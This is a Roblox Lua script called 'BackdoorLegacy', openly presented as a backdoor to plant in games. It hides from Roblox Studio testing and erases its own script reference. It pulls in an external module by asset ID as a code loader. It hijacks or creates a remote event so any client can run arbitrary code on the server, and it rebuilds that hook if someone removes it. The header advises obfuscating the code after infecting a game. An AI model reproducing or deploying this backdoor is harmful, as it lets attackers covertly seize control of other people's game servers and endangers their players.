-- BackdoorLegacy 
-- By IvanTheSkid 

-- github.com/IvanTheProtogen/BackdoorLegacy

-- Features we have:
-- -- Anti-tamper remote
-- -- Compatibility with any backdoor scanner
-- -- Stealthiness 
-- -- Shortcuts (%username%, %userid%, %userpath%)

-- IT IS RECOMMENDED TO OBFUSCATE THE CODE AFTER INFECTING IT WITH THIS BACKDOOR
-- I RECOMMEND USING MOONSEC V3 TO OBFUSCATE

if game:GetService("RunService"):IsStudio() then 
	return 
end

pcall(function()
	getfenv().script:Destroy()
	getfenv().script = nil 
end)

local loadstring,rmt,newBD,onExec,onTamper 
local heartbeat = game:service("RunService").Heartbeat 
local ReplSt = game:service("ReplicatedStorage")
while true do 
	local suc 
	suc,loadstring = pcall(require,14132891321)
	if suc and loadstring then 
		break 
	end 
	task.wait()
end
function onExec(plr,code)
	code = code:gsub("%username%",plr.Name):gsub("%userid%",plr.UserId):gsub("%userpath",'game:service("Players"):WaitForChild("'..plr.Name..'")')
	pcall(loadstring.SpawnS,loadstring,code,workspace)
end
function newBD()
	rmt = nil
	for _,inst in workspace:GetDescendants() do 
		if inst:IsA("RemoteEvent") then 
			rmt = inst 
			break
		end 
	end 
	for _,inst in ReplSt:GetDescendants() do 
		if inst:IsA("RemoteEvent") then 
			rmt = inst 
			break
		end 
	end 
	for _,inst in workspace:GetDescendants() do 
		if inst:IsA("RemoteFunction") then 
			rmt = inst 
			break
		end 
	end 
	for _,inst in ReplSt:GetDescendants() do 
		if inst:IsA("RemoteFunction") then 
			rmt = inst 
			break
		end 
	end 
	for _,inst in workspace:GetDescendants() do 
		if inst:IsA("BaseRemoteEvent") then 
			rmt = inst 
			break
		end 
	end 
	for _,inst in ReplSt:GetDescendants() do 
		if inst:IsA("BaseRemoteEvent") then 
			rmt = inst 
			break
		end 
	end 
	rmt = rmt or Instance.new("RemoteEvent",workspace)
	if rmt:IsA("RemoteFunction") then 
		rmt.OnServerInvoke = onExec
	elseif rmt:IsA("BaseRemoteEvent") then 
		rmt.OnServerEvent:Connect(onExec)
	end 
	task.spawn(function()
		while true do 
			if rmt and (rmt:IsDescendantOf(workspace) or rmt:IsDescendantOf(ReplSt)) then else 
				task.spawn(newBD) 
				break 
			end 
			heartbeat:Wait()
		end 
	end)
end
newBD()
